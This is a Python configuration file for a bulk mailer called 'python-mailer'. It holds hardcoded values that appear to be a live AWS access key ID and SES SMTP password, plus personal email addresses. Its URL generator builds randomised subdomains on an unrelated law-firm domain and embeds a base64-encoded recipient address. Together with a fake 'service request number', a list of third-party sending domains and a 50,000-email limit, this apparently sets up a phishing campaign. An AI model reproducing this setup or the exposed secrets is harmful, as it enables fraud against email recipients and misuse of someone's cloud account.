"""
Global config file. Change variable below as needed but ensure that the log and
retry files have the correct permissions.
"""

from datetime import datetime
import random
import string

# File settings
LOG_FILENAME = "C:\\Users\\HP\\PycharmProjects\\python-mailer\\pymailer.log"
CSV_RETRY_FILENAME = 'C:\\Users\\HP\\PycharmProjects\\python-mailer\\pymailer.csv'
STATS_FILE = 'C:\\Users\\HP\\PycharmProjects\\python-mailer\\pymailer-%s.stat' % str(datetime.now()).replace(' ',
                                                                                                             '-').replace(
    ':', '-').replace('.', '-')

# Regular SMTP settings
SMTP_HOST = 'localhost'
SMTP_PORT = 25
FROM_NAME = 'Company Name'
FROM_EMAIL = 'company@example.com'
ACCOUNT_ID = 'AKIAZTK2I3NAIPKVMD4R'
EMAIL_PASSWORD = None  # Optional for regular SMTP

# AWS SES settings
SES_SMTP_HOST = 'email-smtp.eu-west-1.amazonaws.com'  # Updated SMTP endpoint
SES_SMTP_PORT = 587  # Use STARTTLS for this port
SES_FROM_NAME = ''  # Updated name
SES_ACCOUNT_ID = 'AKIAZTK2I3NAIPKVMD4R'  # Updated name
SES_FROM_EMAIL = 'support@mahmoudelfar.com'  # Updated user
SES_EMAIL_PASSWORD = 'BELr4YI3jcptUpDsryue63E5YsEXM2GNmbV3jkKbmce3'  # Updated AWS SES SMTP password
AWS_REGION = 'eu-west-1'  # Region for API or additional integrations


def generate_random_string(length):
    """
    Generate a random string of specified length.
    :param length: Length of the random string.
    :return: Random string.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_action_url(base_url):
    """
    Replace placeholders like Rand(x) in the URL with random strings.
    :param base_url: Base URL containing placeholders (e.g., Rand(8)).
    :return: Updated URL with random strings.
    """
    while "Rand(" in base_url:
        start = base_url.find("Rand(")
        end = base_url.find(")", start)
        if start != -1 and end != -1:
            length = int(base_url[start + 5:end])  # Extract the number in Rand(x)
            random_string = generate_random_string(length)
            base_url = base_url[:start] + random_string + base_url[end + 1:]
        else:
            break
    return base_url


def generate_service_request_number():
    """
    Generate a service request number in the format O(random_string).
    """
    return 'O' + generate_random_string(8)


# html variables
date_long = datetime.now().strftime("%B %d, %Y")
service_request_number = generate_service_request_number()
action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6)Z2VvcmdlcXVpbjE5QGdtYWlsLmNvbQ==Rand(6)"
action_url = generate_action_url(action_url_template)
print("Generated Action URL:", action_url)

# Mail-form domains (optional, for reference)
MAILFORM_DOMAINS = [
    "endiveinfotech.com",
    "binaryprototypes.com",
    "mahmoudelfar.com",
    "geth.org.br",
    "faxinando.com.br",
    "expandgestao.com.br",
]

# Test recipients list
TEST_RECIPIENTS = [
    {'name': 'John Doe', 'email': 'georgequin19@gmail.com'},
]

# Email sending limits (optional, for reference)
EMAIL_LIMIT = 50000
